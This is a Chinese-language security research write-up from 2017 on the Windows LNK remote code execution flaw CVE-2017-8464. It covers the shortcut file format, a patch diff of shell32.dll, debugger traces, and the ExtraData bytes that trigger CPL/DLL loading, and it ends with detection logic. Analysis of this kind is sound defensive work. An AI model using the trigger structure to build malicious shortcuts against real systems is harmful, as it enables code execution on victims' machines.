                            _                                          _   
                           (_)                                        | |  
              __   ____  __ _  _   _  _ __ ___   _ __     _ __    ___ | |_ 
              \ \ / /\ \/ /| || | | || '_ ` _ \ | '_ \   | '_ \  / _ \| __|
               \ V /  >  < | || |_| || | | | | || |_) |_ | | | ||  __/| |_ 
                \_/  /_/\_\| | \__,_||_| |_| |_|| .__/(_)|_| |_| \___| \__|
                          _/ |                  | |                        
                         |__/                   |_| 
           
/---------------------------------------------------------------------------------------\
|>................[ ITW 0day：LNK远程代码执行漏洞（CVE-2017-8464）的简要分析]..........<|
|>......................[          by nEINEI/vxjump.net         ]......................<|
|>..........................[           2017-06-28           ].........................<|
\>..........................[         neineit@gmail.com      ].........................</
 

[目录]
[0x01].简介
[0x02].lnk文件格式解析
[0x03].补丁对比
[0x04].漏洞分析
[0x05].关于检测
[0x06].其它


[0x01].简介
   2017年6月微软的补丁日公布2个在野的0day漏洞，CVE-2017-8464（LNK漏洞）和CVE-2017-8543(Search服务的漏洞)。
本文将对LNK漏洞的成因及相关利用进行简要的分析。

详细信息请查看：
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-8464
http://www.securityfocus.com/bid/98818

漏洞影响版本:   
Microsoft	Windows 10	3
Microsoft	Windows 7	1
Microsoft	Windows 8	1
Microsoft	Windows 8.1	2
Microsoft	Windows Server 2008	2
Microsoft	Windows Server 2012	2
Microsoft	Windows Server 2016

[0x02].lnk文件格式解析

   lnk文件是一种较为简单的文件格式，但因操作多涉及shell编程，COM相关等WINDOWS基础，故相关信息完全理解并不十分容易，
反而不像复杂的多的PE文件那样清晰容易解析。一个典型的lnk文件格式如下所示:

              **********************.lnk 文件格式****************
			  
              +---------------------------+
              | lnk file header           |     
              +---------------------------+ >------.
              | Shell Item Id List        |        |
              +---------------------------+        |
              | File location info        |        |
              +---------------------------+        |
              | Description string        |        |
              +---------------------------+       ---
              | Relative path string      |  这几个节不是每一个都必须存在，如果存在就要按这样的顺序关系排列。
              +---------------------------+       ---
              | Working directory string  |        |
              +---------------------------+        |
              | Command line string       |        |
              +---------------------------+        |
              | Icon filename string      |        |
              +---------------------------+ >------.
              | Extra stuff               |
              +---------------------------+
 
    和本次漏洞有关的位置是，是1） Shell Item Id List  ， 2）Extra stuff  
    关于LNK文件格式的较详细介绍请参考，之前在Vxjump上发布的文章，此处不再赘述:
	http://www.vxjump.net/files/security_research/lnk_inf.txt

    一些安全公司提到这个漏洞和stuxnet利用的CVE-2010-2568十分相像，其实是有一定道理的，都是和利用控制面板快捷方式CPL加载有关，但又有
一定的区别。
    
	主要因素还是在Shell Item Id List 部分，这部分描述快捷方式的路径部分。
	例如，我有一个c:\a\b\c\x.jpg 文件，那么为这个文件创建一个快捷方式后，会产生一个shell Item ID list结构
	
	Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F

00000040                                        4B 01 14 00               K   
00000050   1F 50 E0 4F D0 20 EA 3A  69 10 A2 D8 08 00 2B 30    PO??i ⒇  +0
00000060   30 9D 19 00 2F 43 3A 5C  00 00 00 00 00 00 00 00   0   /C:\        
00000070   00 00 00 00 00 00 00 00  00 00 00 44 00 31 00 00              D 1  
00000080   00 00 00 E7 4A 01 73 10  00 61 00 34 00 09 00 04      J s  a 4    
00000090   00 EF BE E7 4A 01 73 E7  4A 01 73 2E 00 00 00 7A    锞J sJ s.   z
000000A0   65 01 00 00 00 4F 02 00  00 00 00 00 00 00 00 00   e    O          
000000B0   00 00 00 00 00 DB B6 E5  00 61 00 00 00 10 00 44        鄱?a     D
000000C0   00 31 00 00 00 00 00 E7  4A 01 73 10 00 62 00 34    1     J s  b 4
000000D0   00 09 00 04 00 EF BE E7  4A 01 73 E7 4A 01 73 2E        锞J sJ s.
000000E0   00 00 00 D3 65 01 00 00  00 20 01 00 00 00 00 00      e           
000000F0   00 00 00 00 00 00 00 00  00 69 96 E5 00 62 00 00            i b  
00000100   00 10 00 44 00 31 00 00  00 00 00 E7 4A C3 73 10      D 1     Js 
00000110   00 63 00 34 00 09 00 04  00 EF BE E7 4A 01 73 E7    c 4     锞J s?
00000120   4A C3 73 2E 00 00 00 E9  65 01 00 00 00 1F 00 00   Js.   e       
00000130   00 00 00 00 00 00 00 00  00 00 00 00 00 EC BF 2D                炜-
00000140   01 63 00 00 00 10 00 50  00 32 00 AE 3D 04 00 9F    c     P 2 ?  ?
00000150   2F 00 80 20 00 78 2E 4A  50 47 00 3C 00 09 00 04   /   x.JPG <    
00000160   00 EF BE E7 4A C1 73 E7  4A C1 73 2E 00 00 00 F2    锞JsJs.   ?
00000170   65 01 00 00 00 64 00 00  00 00 00 00 00 00 00 00   e    d          
00000180   00 00 00 00 00 00 00 00  00                                 

    这部分，可以表示为一个结构
	struct ShellItem{
	 DWORD    size;
	 SHITEMID item[1];  //这里表面是一个可变的节，随着目录的增加这里可以增长
	}
	
	typedef struct _SHITEMID
      { 
        unsigned short int cb;  //本节的长度
        unsigned char  abID[0]; //定义一个可变的结构
      }SHITEMID,*LPSHITEMID;
    
	通常来讲，SHITEMID[0]代表我的电脑，
	\x14\x00（这里是长度）
	\x1F （类型）
	\x50 （未知）
	\xE0\x4F\xD0\x20\xEA\x3A\x69\x10\xA2\xD8\x08\x00\x2B\x30\x30\x9D（GUID）
	上面GUID转换过来就是HKEY_CLASSES_ROOT\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}，大家可以上自己的电脑上查询。
	
	快捷方式默认的上层目录都是从这里开始，按照这个结构依次寻找可以找出\a , \b, \c ， x.jpg 对应的
	SHITEMID[1]，SHITEMID[2]，SHITEMID[3]，SHITEMID[4]结构信息
	
	那么，对于控制面板的快捷方式又会有所不同，SHITEMID[0] - 对应我的电脑信息，
	SHITEMID[1] - 对应控制面板的GUID信息，通常是\x19\x00\x2F\x43\x3A\x5C\x00\x00\x00\x00\x00\x00
	SHITEMID[2] - 对应具体的控制面板cpl程序信息，标准控制面板快捷方式会把自身的路径信息添加在Extra stuff这部分结构中。
	例如，你创建一个控制面板中的Auto Play的快捷方式，查看Extra data这部分信息，可以看到一个GUID，查询一下就可以知道是对应哪个cpl功能程序
	Auto Play：
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace\
	{9C60DE1E-E5FC-40f4-A487-460851A8D915}

	
	根据之前分析CVE-2010-2568的经验，漏洞的SHITEMID[1]填充了控制面板的GUID信息{21EC2020-3AEA-1069-A2DD-08002B30309D}
	SHITEMID[2]添加对应的cpl程序路径。 根据分析对CVE-2017-8464，单纯的添加cpl程序的路径信息是不会触发漏洞的，必须构造特殊的一个Extra data信息。
 

[0x03].补丁对比

   分析平台：win7 x86
   文件：  shell32.dll (补丁前：6.1.7601.1892 ，补丁后：6.1.7601.23806)
    
   通过path diff 可以看到微软这次修补了很多的地方，根据上次经验自然要查询CPL_LoadCPLModule函数被调用的情况，
...
CAutoComplete::_OnSearchComplete(SearchResults *,_DPA *)                                                      738F086E CAutoComplete::_OnSearchComplete(SearchResults *,_DPA *)                                                
kfapi::CFolderRedirector::Redirect(_GUID const &,HWND__ *,ulong,ushort const *,_GUID const *,uint,ushort * *) 73B61419 kfapi::CFolderRedirector::Redirect(_GUID const &,HWND__ *,ulong,ushort const *,_GUID const *,uint,ushort * *)  
CopyStreamToFile(IStream *,ushort const *,unsigned __int64)                                                   73B16E33 CopyStreamToFile(IStream *,ushort const *,unsigned __int64)                                                     
CControlPanelFolder::_GetPidlFromAppletId(ushort const *,_ITEMID_CHILD * *)                                   73AF300B CControlPanelFolder::_GetPidlFromAppletId(ushort const *,_ITEMID_CHILD * *)                                     
CAutoComplete::_AppendNext(int)                                                                               73AA4538 CAutoComplete::_AppendNext(int)                                                                                  
CAutoComplete::_AppendPrevious(int)                                                                           73AA460E CAutoComplete::_AppendPrevious(int)                                                                               
CGrep::_InitializeChunkBuffer(void)                                                                           73B9066F CGrep::_InitializeChunkBuffer(void)                                                                           
...

    其中，CControlPanelFolder::_GetPidlFromAppletId(ushort const *,_ITEMID_CHILD * *) 的修补代码是和CPL_LoadCPLModule函数有关系。
很关键的一个点是这里：

  if ( SHExpandEnvironmentStringsW(&Start, &v17, 260) )
        {
          if ( CControlPanelFolder::_IsRegisteredCPLApplet(v11, &v17) ) // --- 增加了一个校验
          {
            v12 = 0;
            v7 = CPL_LoadCPLModule(&v17, 0);
            if ( v7 )
            {
              v13 = 0;
              do
              {
                v8 = (struct _DSA *)*((_DWORD *)v7 + 135);
                if ( v6 >= *(_DWORD *)v8 )
                  break;
                v9 = DSA_GetItemPtr(v8, v6);
                if ( v9 )
                {
                  v12 = IDControlCreate(
         ...   
        } 
    至此，我们已经知道，关键是如何触发这个漏洞的路径，来调用CPL_LoadCPLModule，因为如果不是该处存在问题，那么微软不会用_IsRegisteredCPLApplet来
过滤，因为CVE-2010-2568也是用这个机制来修补的。 

[0x04].漏洞分析
	
	一路追溯我们可以得到一个触发路径：
	CControlPanelFolder::ParseDisplayName （IDA中无法看到具体的对CControlPanelFolder::ParseDisplayName的引用）
	  --> CControlPanelFolder::_GetPidlFromAppletId
	        -->CPL_LoadCPLModule
	所以，对CControlPanelFolder::ParseDisplayName的调用应该是通过动态的对象虚表函数调用来实现的。
    设置断点在CControlPanelFolder::ParseDisplayName，任意打开存在.lnk的文件目录，很难获得触发。说明，通常的lnk文件是缺少某些信息或相应字段不对。
	利用CVE-2010-2568的样本做测试，也不能触发这个断点。但打印出执行路径信时我看了一些值得注意的地方，按照之前这个漏洞的调用会执行
	_DecodeSpecialFolder。但这个函数实际上并没执行完全。
	
	   46   101 [  2]     SHLWAPI!SHReadDataBlockList
    3     0 [  3]       SHLWAPI!__security_check_cookie eax = 0
   48   104 [  2]     SHLWAPI!SHReadDataBlockList eax = 0
  119  3446 [  1]   SHELL32!CShellLink::_LoadFromStream
   16     0 [  2]     SHELL32!CShellLink::_DecodeSpecialFolder
   11     0 [  3]       SHLWAPI!SHFindDataBlock eax = 0
   22    11 [  2]     SHELL32!CShellLink::_DecodeSpecialFolder
   11     0 [  3]       SHLWAPI!SHFindDataBlock eax = 0
   27    22 [  2]     SHELL32!CShellLink::_DecodeSpecialFolder
    5     0 [  3]       SHELL32!SHFree
    8     0 [  3]       ole32!CoTaskMemFree
    7     0 [  4]         ole32!CRetailMalloc_Free eax = 76b076bc
   10     7 [  3]       ole32!CoTaskMemFree eax = 76b076bc
   33    44 [  2]     SHELL32!CShellLink::_DecodeSpecialFolder
    3     0 [  3]       SHELL32!__security_check_cookie eax = 76b076bc
	
	
   void __thiscall CShellLink::_DecodeSpecialFolder(CShellLink *this)
{
  CShellLink *v1; // esi@1
  int v2; // eax@1
  int v3; // edi@1
  signed int v4; // eax@3
  signed int v5; // eax@5
  int v6; // ecx@5
  char *v7; // edi@7
  unsigned int v8; // ebx@7
  int i; // eax@7
  bool v10; // zf@9
  const ITEMIDLIST *v11; // eax@13
  ITEMIDLIST *v12; // ebx@14
  ITEMIDLIST *v13; // edi@15
  int v14; // eax@15
  int v15; // esi@15
  int v16; // eax@15
  int v17; // eax@20
  int v18; // edi@20
  const struct _ITEMIDLIST_RELATIVE *pidl; // [sp+Ch] [bp-Ch]@7
  ITEMIDLIST *pidla; // [sp+Ch] [bp-Ch]@13
  LPITEMIDLIST v21; // [sp+10h] [bp-8h]@1

  v21 = 0;
  v1 = this;
  v2 = SHFindDataBlock(*((_DWORD *)this + 57), 0xA000000B); 
  v3 = v2;
  
  if ( v2 )  //如果查找成功，那么会继续，否则释放ILFree(pidla);
  {
    if ( !CShellLink::_ShouldDecodeSpecialFolder(v1, (const struct _GUID *)(v2 + 8)) )
      goto LABEL_19;
    v4 = 0x4000;
    if ( *((_DWORD *)v1 + 65) & 0x400000 )
      v4 = 20480;
    v5 = SHGetKnownFolderIDList(v3 + 8, v4, 0, &v21);
    v6 = *(_DWORD *)(v3 + 24);
  }
  else
  {
    v17 = SHFindDataBlock(*((_DWORD *)v1 + 57), 0xA0000005);
    v18 = v17;
    if ( !v17 )
      goto LABEL_19;
    v21 = SHCloneSpecialIDList(0, *(_DWORD *)(v17 + 8), 0);
    v6 = *(_DWORD *)(v18 + 12);
    v5 = v21 != 0 ? 0 : -2147024882;
  }
  
   显然，SHFindDataBlock是失败的，因为缺少她所要搜索的DataBlock,查看LNK文件手册可以看到，里面提到了Extra Data结构，
里面涉及了很多结构和其签名信息，显示上面调用时的参数就是其签名信息，0xA0000005，0xA000000B
 ConsoleDataBlock - 0xA0000002
 ConsoleFEDataBlock - 0xA0000004
 EnvironmentVariableDataBlock - 0xA0000001
 IconEnvironmentDataBlock - 0xA0000007
 PropertyStoreDataBlock - 0xA0000009
 SpecialFolderDataBlock - 0xA0000005 （上文函数中提到的参数）
 KnownFolderDataBlock - 0xA000000B （上文函数中提到的参数）
   
   所以，可以在CVE-2010-2568样本的基础上，添加一个ExtraData数据，依次添加SpecialFolderDataBlock和KnownFolderDataBlock实验。
   具体的格式：
   struct KnownFolderDataBlock{
    DWORD BlockSize;
	DWORD BlockSignature;
	CHAR  GUID[16];
	DWORD offset;
   } 
   
   KnownFolderDataBlock：
   \x1C\x00\x00\x00\x0B\x00\x00\xA0\x19\x27\x6D\x74\x59\x74\x6A\x2D\x63\x1A\x9D\x7f\x63\x24\x8C\x6D\x00\x00x00\x03
   
   中间的GUID具体指向怎样的特殊的文件ID其，文档里面似乎没有介绍清楚，只能构造已经存在的一些GUID，反复测试，没有成功（如果有测试成功的朋友，还请指点）。
   
   对于SpecialFolderDataBlock结构相对简单一些，
   struct SpecialFolderDataBlock{
    DWORD BlockSize;
	DWORD BlockSignature;
	DWORD ID;
	DWORD offset;
   } 

   添加这些数据：\x10\x00\x00\x00\x05\x00\x00\xA0\x03\x00\x00\x00\x28\x00\x00\x00\x00\x00
   注意这里面的0x28，根据手册说明是offset，
A 32-bit, unsigned integer that specifies the location of the ItemID of the first child
segment of the IDList specified by SpecialFolderID. This value is the offset, in bytes, into the
link target IDList.
   这里我计算的是SHITEMID[2] - SHITEMID[0] 之间的差值。
   这样，你就可以看到.lnk文件被加载的call stackl.

Offset      0  1  2  3  4  5  6  7   8  9  A  B  C  D  E  F

00000080   00 00 00 6A 00 00 00 00  00 00 05 01 05 01 46 00      j          F 
00000090   3A 00 5C 00 2E 00 5C 00  2E 00 5C 00 2E 00 5C 00   : \ . \ . \ . \ 
000000A0   2E 00 5C 00 2E 00 74 00  65 00 73 00 74 00 2E 00   . \ . t e s t . 
000000B0   63 00 70 00 6C 00 00 00                            c p l      

最终加载的情况: SHExpandEnvironmentStringsW会获得系统目录和后面的目录拼接为一个系统路径
SHELL32!CControlPanelFolder::_GetPidlFromAppletId+0x160:
75ec3da3 50              push    eax
0:017> db eax
0583cde4  43 00 3a 00 5c 00 57 00-69 00 6e 00 64 00 6f 00  C.:.\.W.i.n.d.o.
0583cdf4  77 00 73 00 5c 00 73 00-79 00 73 00 74 00 65 00  w.s.\.s.y.s.t.e.
0583ce04  6d 00 33 00 32 00 5c 00-2e 00 74 00 65 00 73 00  m.3.2.\...t.e.s.
0583ce14  74 00 2e 00 63 00 70 00-6c 00 2c 00 00 00 15 09  t...c.p.l.,.....
0583ce24  38 ce 83 05 18 6f a0 76-d8 ed 15 09 70 f4 c6 75  8....o.v....p..u
0583ce34  53 00 6f 00 66 00 74 00-77 00 61 00 72 00 65 00  S.o.f.t.w.a.r.e.
0583ce44  5c 00 4d 00 69 00 63 00-72 00 6f 00 73 00 6f 00  \.M.i.c.r.o.s.o.
0583ce54  66 00 74 00 5c 00 57 00-69 00 6e 00 64 00 6f 00  f.t.\.W.i.n.d.o.

0:013> kv
ChildEBP RetAddr  Args to Child              
0499d114 75ec3f52 08ec3a48 0499d21c 75c70180 SHELL32!CControlPanelFolder::_GetPidlFromAppletId+0x181 (FPO: [Non-Fpo])
0499d140 75c5799b 08cabc38 00000000 08d5a800 SHELL32!CControlPanelFolder::ParseDisplayName+0x49 (FPO: [Non-Fpo])
0499d1c4 75c5f0af 090ddaac 00000000 08d5a800 SHELL32!CRegFolder::ParseDisplayName+0x93 (FPO: [Non-Fpo])
0499d238 75c606cd 090de3dc 00347098 75c7a660 SHELL32!ReparseRelativeIDList+0x137 (FPO: [Non-Fpo])
0499d27c 75c60715 00000000 00347070 08ead300 SHELL32!TranslateAliasWithEvent+0xa6 (FPO: [Non-Fpo])
0499d294 75c2e84e 00347070 08ead300 05c06258 SHELL32!TranslateAlias+0x15 (FPO: [Non-Fpo])
0499d2c0 75c2e5e3 00000000 00000000 05d5e0c8 SHELL32!CShellLink::_DecodeSpecialFolder+0xf9 (FPO: [Non-Fpo])
0499e584 75beca18 08f4c6d8 00000000 00000000 SHELL32!CShellLink::_LoadFromStream+0x39f (FPO: [Non-Fpo])
0499e7b4 75bec987 0499e840 00000000 0499e7f0 SHELL32!CShellLink::_LoadFromFile+0x90 (FPO: [Non-Fpo])
0499e7c4 75bec8dc 05d5e0dc 0499e840 00000000 SHELL32!CShellLink::Load+0x32 (FPO: [Non-Fpo])
0499e7f0 75bec933 05d5e0d0 0499e840 00000000 SHELL32!InitializeFileHandlerWithFile+0x6a (FPO: [Non-Fpo])
0499ea4c 75c38be0 00000000 0499eaa0 00000002 SHELL32!CFileSysItemString::HandlerCreateInstance+0x168 (FPO: [Non-Fpo])
0499eb04 75c42626 00000000 00000000 00000000 SHELL32!CFileSysItemString::LoadHandler+0x16b (FPO: [Non-Fpo])
0499efb4 75c42674 00000000 00000001 0499f00c SHELL32!CFSFolder::_BindHandler+0x1d1 (FPO: [Non-Fpo])
0499efd4 75bf9aa6 09058198 00000000 00000001 SHELL32!CFSFolder::GetUIObjectOf+0x21 (FPO: [Non-Fpo])
0499f490 75c3128d 09058180 05b4c0b8 05b4c0b8 SHELL32!CFSFolder::_GetPerceivedType+0x60 (FPO: [Non-Fpo])
0499f4b0 75c371fd 00000000 05b4c0b8 05b4c0b8 SHELL32!CFSFolder::_GetInnateDetailsFromHelper+0x47 (FPO: [Non-Fpo])
0499f4e0 75c31398 00000000 05b4c0b8 75c632ac SHELL32!CFSFolder::_GetInnateDetailsWithHandlerExceptions+0x61 (FPO: [Non-Fpo])
0499f4fc 75c3134c 05b4c0b8 75c632ac 0499f578 SHELL32!CFSFolder::_GetInnateDetails+0x18 (FPO: [Non-Fpo])
0499f538 75c312e9 05b4c0b8 75c632ac 0499f578 SHELL32!CFSFolder::_GetInnateDetailsAsVariant+0x41 (FPO: [Non-Fpo])
0499f580 75c0e197 09058198 05b4c0b8 75c632ac SHELL32!CFSFolder::GetDetailsEx+0x40 (FPO: [Non-Fpo])
0499f5b0 75c0ed8d 09058198 05b4c0b8 09056584 SHELL32!GetPerceivedType+0x44 (FPO: [Non-Fpo])
0499f5f8 75c0dc3a 0499f61c 08d6d4e0 09056584 SHELL32!GetFolderTypeFromItems+0xd8 (FPO: [Non-Fpo])
0499f63c 75c0d99c 08d6d4e0 09056584 09058198 SHELL32!CEnumTask::_CalculateFolderType+0x2f (FPO: [Non-Fpo])
0499f698 75c09e63 09058198 0499f6f0 0499f6ec SHELL32!CEnumTask::_IncrFillEnumToView+0x192 (FPO: [Non-Fpo])
0499f6f8 75c09fcd 09058198 00000001 755f81eb SHELL32!CEnumTask::_IncrEnumFolder+0x2b5 (FPO: [Non-Fpo])
0499f73c 75c38226 09056550 01000000 80000000 SHELL32!CEnumTask::InternalResumeRT+0x325 (FPO: [Non-Fpo])
0499f75c 75c761fb 09056564 7fffffff 05cb7708 SHELL32!CRunnableTask::Run+0xce (FPO: [Non-Fpo])
0499f778 75c78a8b 0499f7b4 00000000 090b62d8 SHELL32!CShellTask::TT_Run+0x167 (FPO: [Non-Fpo])
0499f7c0 75c78bbf 0499f7d8 7753b2b1 05cb7708 SHELL32!CShellTaskThread::ThreadProc+0xa3 (FPO: [Non-Fpo])
0499f7c8 7753b2b1 05cb7708 03de89a8 0499f84c SHELL32!CShellTaskThread::s_ThreadProc+0x1b (FPO: [Non-Fpo])
0499f7d8 773dd7c4 090b62d8 7322bf39 03de89a8 SHLWAPI!ExecuteWorkItemThreadProc+0xe (FPO: [Non-Fpo])   
   
微软的修复方式是在_IsRegisteredCPLApplet中判断，传入的要加载的DLL路径和默认存在的.cpl路径是否相符，如果输入的路径不存在于白名单中，那么返回
false，不加载任何DLL。

对于补丁的函数：  他要判断是否存在于一个列表中。 先获得第一个元素，然后依次比较：
76f136bb ff30            push    dword ptr [eax]      ds:0023:067f1170=038bf1a0
0:002> db 038bf1a0
038bf1a0  43 00 3a 00 5c 00 50 00-52 00 4f 00 47 00 52 00  C.:.\.P.R.O.G.R.
038bf1b0  41 00 7e 00 31 00 5c 00-4d 00 49 00 46 00 35 00  A.~.1.\.M.I.F.5.
038bf1c0  42 00 41 00 7e 00 31 00-5c 00 4f 00 66 00 66 00  B.A.~.1.\.O.f.f.
038bf1d0  69 00 63 00 65 00 31 00-34 00 5c 00 4d 00 4c 00  i.c.e.1.4.\.M.L.
038bf1e0  43 00 46 00 47 00 33 00-32 00 2e 00 43 00 50 00  C.F.G.3.2...C.P.
038bf1f0  4c 00 00 00 00 00 05 10-66 a6 ec 53 ff ff 00 8c  L.......f..S....
038bf200  57 00 69 00 6e 00 64 00-6f 00 77 00 73 00 20 00  W.i.n.d.o.w.s. .
038bf210  77 00 69 00 6c 00 6c 00-20 00 69 00 6e 00 73 00  w.i.l.l. .i.n.s.

第二次循环
0:002> db 0692e7d0
0692e7d0  43 00 3a 00 5c 00 57 00-69 00 6e 00 64 00 6f 00  C.:.\.W.i.n.d.o.
0692e7e0  77 00 73 00 5c 00 73 00-79 00 73 00 74 00 65 00  w.s.\.s.y.s.t.e.
0692e7f0  6d 00 33 00 32 00 5c 00-77 00 73 00 63 00 75 00  m.3.2.\.w.s.c.u.
0692e800  69 00 2e 00 63 00 70 00-6c 00 00 00 6c 00 00 00  i...c.p.l...l...
0692e810  33 f7 4b 53 01 00 00 80-14 00 4c 00 45 00 33 00  3.KS......L.E.3.
0692e820  43 00 42 00 46 00 39 00-32 00 41 00 33 00 34 00  C.B.F.9.2.A.3.4.
0692e830  36 00 46 00 33 00 34 00-30 00 42 00 31 00 39 00  6.F.3.4.0.B.1.9.
0692e840  31 00 35 00 38 00 43 00-32 00 35 00 42 00 43 00  1.5.8.C.2.5.B.C.
第三次：
0:002> db poi(eax)
0384a9c0  43 00 3a 00 5c 00 57 00-69 00 6e 00 64 00 6f 00  C.:.\.W.i.n.d.o.
0384a9d0  77 00 73 00 5c 00 73 00-79 00 73 00 74 00 65 00  w.s.\.s.y.s.t.e.
0384a9e0  6d 00 33 00 32 00 5c 00-46 00 6c 00 61 00 73 00  m.3.2.\.F.l.a.s.
0384a9f0  68 00 50 00 6c 00 61 00-79 00 65 00 72 00 43 00  h.P.l.a.y.e.r.C.
0384aa00  50 00 4c 00 41 00 70 00-70 00 2e 00 63 00 70 00  P.L.A.p.p...c.p.
0384aa10  6c 00 00 00 00 00 6e 00-ea 57 13 53 73 00 00 80  l.....n..W.Ss...
0384aa20  32 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  2...............
0384aa30  01 00 00 00 00 00 00 00-a0 71 60 06 e8 95 a5 76  .........q`....v   
  
这样即便尝试加载路径，也会因为不再白名单中而被拒绝加载。

[0x05].关于检测

    要想做到通用的检测该漏洞，需要是针对shell item id list的非常规的格式检测
	SHITEMID[0] = \x1F\x50\xE0\x4F\xD0\x20\xEA\x3A\x69\x10\xA2\xD8\x08\x00\x2B\x30\x9D
    SHITEMID[1] = \x2E\x1E\x20\x20\xEC\x21\xEA\x3A\x69\x10\xA2\xDD\x08\x00\x2B\x30\x30\x9D
    
	另外，针对ExtraDtat
	ExtraData.BlockSize = 0x00000010
	ExtraData.BlockSignature = 0xA0000005
	
	检测逻辑如下：
	
	if(SHITEMID[0] == "\x1f \x50 ..." & SHITEMID[1] = "\x2e \x1f ...")
	{
	   if(SHITEMID[2] in (".\\"  || ".dll"))
	   {
	      if(ExtraData.BlockSize = 0x00000010 && ExtraData.BlockSignature = 0xA0000005)
		  {
		    alert("Found CVE-2017-8464 Vulnerability\n");
		  }
	   }
	} 
	
[0x06].其它
    限于对KnownFolderDataBlock了解的缺乏及相关调用的更深入分析，不能确定KnownFolderDataBlock是否也一定和这个漏洞存在关联，但显然微软
修补这个漏洞的方法是基于白名单过滤的，即便KnownFolderDataBlock也可以被利用触发，但还是不会加载成功的。

[参考文献]
[MS-SHLLINK]-160714.pdf
https://msdn.microsoft.com/en-us/library/dd891343.aspx

